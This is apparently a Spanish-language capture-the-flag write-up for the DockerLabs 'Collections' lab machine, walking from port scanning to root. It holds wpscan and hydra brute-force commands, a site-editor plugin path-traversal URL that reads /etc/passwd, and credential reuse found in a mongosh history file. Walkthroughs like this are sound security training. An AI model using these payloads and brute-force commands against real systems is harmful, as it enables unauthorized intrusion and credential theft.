---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Collections DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip collections.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh collections.tar
```

Info:

```
                          ##        .         
	             ## ## ##       ==         
	          ## ## ## ##      ===         
	      /""""""""""""""""\___/ ===       
	 ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	      \______ o          __/           
	        \    \        __/            
	         \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				    

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 11:34 EDT
Nmap scan report for asucar.dl (172.17.0.2)
Host is up (0.000022s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 25:3f:a6:b3:1b:a8:dc:e6:ef:0a:51:a7:d6:f4:15:c9 (ECDSA)
|_  256 d1:38:83:b2:33:0d:ad:b6:44:4f:b5:6e:fb:17:08:9f (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
27017/tcp open  mongodb MongoDB 7.0.9
| mongodb-databases: 
|   ok = 0.0
|   codeName = UnsupportedOpQueryCommand
|   errmsg = Unsupported OP_QUERY command: listDatabases. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|_  code = 352
| mongodb-info: 
|   MongoDB Build info
|     openssl
|       running = OpenSSL 3.0.2 15 Mar 2022
|       compiled = OpenSSL 3.0.2 15 Mar 2022
|     gitVersion = 3ff3a3925c36ed277cf5eafca5495f2e3728dd67
|     allocator = tcmalloc
|     sysInfo = deprecated
|     javascriptEngine = mozjs
|     version = 7.0.9
|     ok = 1.0
|     modules
|     storageEngines
|       1 = wiredTiger
|       0 = devnull
|     maxBsonObjectSize = 16777216
|     debug = false
|     bits = 64
|     buildEnvironment
|       target_arch = x86_64
|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE2_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 ABSL_FORCE_ALIGNED_ACCESS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_FILESYSTEM_NO_CXX20_ATOMIC_REF BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_SYSTEM_NO_DEPRECATED BOOST_THREAD_USES_DATETIME BOOST_THREAD_VERSION 5
|       cc = /opt/mongodbtoolchain/v4/bin/gcc: gcc (GCC) 11.3.0
|       cxxflags = -Woverloaded-virtual -Wpessimizing-move -Wno-maybe-uninitialized -fsized-deallocation -Wno-deprecated -std=c++20
|       cxx = /opt/mongodbtoolchain/v4/bin/g++: g++ (GCC) 11.3.0
|       linkflags = -Wl,--fatal-warnings -B/opt/mongodbtoolchain/v4/bin -gdwarf-5 -pthread -Wl,-z,now -fuse-ld=lld -fstack-protector-strong -gdwarf64 -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags
|       target_os = linux
|       ccflags = -Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -g2 -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -gdwarf-5 -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -gdwarf64 -Wa,--nocompress-debug-sections -fno-builtin-memcmp -Wimplicit-fallthrough=5
|       distarch = x86_64
|       distmod = ubuntu2204
|     versionArray
|       3 = 0
|       0 = 7
|       1 = 0
|       2 = 9
|   Server status
|     ok = 0.0
|     codeName = UnsupportedOpQueryCommand
|     errmsg = Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|_    code = 352
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     Unsupported OP_QUERY command: serverStatus. The client driver may require an upgrade. For more details see https://dochub.mongodb.org/core/legacy-opcode-removal
|     code
|     codeName
|_    UnsupportedOpQueryCommand
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.24 seconds
```

Si vamos a la pagina web vemos un apache tipico, pero si fuzzeamos mas a fondo...

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
/wordpress            (Status: 200) [Size: 96923]
===============================================================
Finished
===============================================================
```

Vemos que hay un `wordpress` por lo que iremos a ese sitio.

```
URL = http://<IP>/wordpress
```

Pero vemos que no carga muy bien, por lo que si inspeccionamos el codigo de la pagina encontramos que utiliza un dominio llamado `collections.dl`, por lo que haremos lo siguiente.

```shell
nano /etc/hosts

#Dentro del nano
<IP>       collections.dl
```

Lo guardamos y ahora buscamos con el dominio poniendo lo siguiente.

```
URL = http://collections.dl/wordpress
```

Y ahora vemos que si nos carga bien, por lo que vemos dentro del `wordpress` un nombre de usuario llamado `chocolate`, probraemos a ver si existe realmente, llendo a la ruta tipica del panel de login de `wordpress`.

```
URL = http://collections.dl/wordpress/wp-admin/
```

Vemos el panel de login y al probar el usuario, vemos que si existe ya que nos da informacion de que la contraseña no coincide con ese nombre de usuario, ahora veremos si hay mas usuarios.

### wpscan

```shell
wpscan --url http://collections.dl/wordpress/ --enumerate u
```

Info:

```
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://collections.dl/wordpress/ [172.17.0.2]
[+] Started: Fri Aug  9 11:43:42 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://collections.dl/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://collections.dl/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://collections.dl/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://collections.dl/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://collections.dl/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://collections.dl/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] chocolate
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://collections.dl/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Sitemap (Aggressive Detection)
 |   - http://collections.dl/wordpress/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Aug  9 11:43:46 2024
[+] Requests Done: 52
[+] Cached Requests: 7
[+] Data Sent: 14.33 KB
[+] Data Received: 841.848 KB
[+] Memory used: 212.812 MB
[+] Elapsed time: 00:00:03
```

Vemos que solo hay un usuario `chocolate`.

```shell
wpscan --url http://collections.dl/wordpress/ --usernames chocolate --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://collections.dl/wordpress/ [172.17.0.2]
[+] Started: Fri Aug  9 11:44:43 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://collections.dl/wordpress/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://collections.dl/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://collections.dl/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://collections.dl/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Insecure, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://collections.dl/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>
 |  - http://collections.dl/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.5.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://collections.dl/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://collections.dl/wordpress/wp-content/plugins/site-editor/
 | Last Updated: 2017-05-02T23:34:00.000Z
 | [!] The version is out of date, the latest version is 1.1.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://collections.dl/wordpress/wp-content/plugins/site-editor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://collections.dl/wordpress/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - chocolate / chocolate                                                                                                                                                       
Trying chocolate / anthony Time: 00:00:00 <                                                                                                      > (30 / 14344422)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: chocolate, Password: chocolate

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Aug  9 11:44:50 2024
[+] Requests Done: 174
[+] Cached Requests: 35
[+] Data Sent: 56.786 KB
[+] Data Received: 138.7 KB
[+] Memory used: 306.824 MB
[+] Elapsed time: 00:00:06
```

Con esto vemos que sacamos la contraseña del usuario `chocolate` que es la misma que el nombre de usuario.

```
User = chocolate
Pass = chocolate
```

Por lo que nos podriamos logear, pero vemos que hay un plugin en el que se puede ver el `passwd` por lo que podriamor recopilar informacion con ello.

URL = https://www.exploit-db.com/exploits/44340

Si nos vamos a la siguiente URL, veremos el `passwd`.

```
URL = view-source:http://collections.dl/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Y vemos 2 usuarios, pero nos centraremos en tirarle fuerza bruta a uno de ellos llamado `chocolate`.

### hydra

```shell
hydra -l chocolate -P <WORDLIST> ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-09 11:49:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: chocolate   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 27 final worker threads did not complete until end.
[ERROR] 27 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-09 11:49:42
```

Vemos que nos saca una credenciales, por lo que nos conectaremos por `ssh` con ellas.

```
User = chocolate
Pass = estrella
```

### SSH

```shell
ssh chocolate@<IP>
```

Metemos la contarseña y ya estariamos dentro.

### Escalate user dbadmin

Si nos vamos a la siguiente ubicacion `~/.mongodb/mongosh` veremos varios archivos, pero el que nos interesa es el siguiente.

```shell
cat mongosh_repl_history
```

Info:

```
show dbs
db.fsyncLock()
db.usuarios.insert({"usuario": "dbadmin", "contraseña": "chocolaterequetebueno123"})
use accesos
```

Vemos que tenemos unas credenciales y si recordamos, hay un usuario llamado `dbadmin` por lo que cambiaremos a ese usuario con esa contarseña.

```shell
su dbadmin
```

Y metemos esa contarseña, por lo que ya seriamos ese usuario.

### Escalate Privileges

Aparentemente no vemos ninguna escala de privilegios, pero si probamos la misma contarseña del usuario `dbadmin` con `root` veremos que funciona.

```shell
su root
```

Ponemos la siguiente contarseña `chocolaterequetebueno123` y veremos que somos `root`, por lo que ya la habriamos terminado.
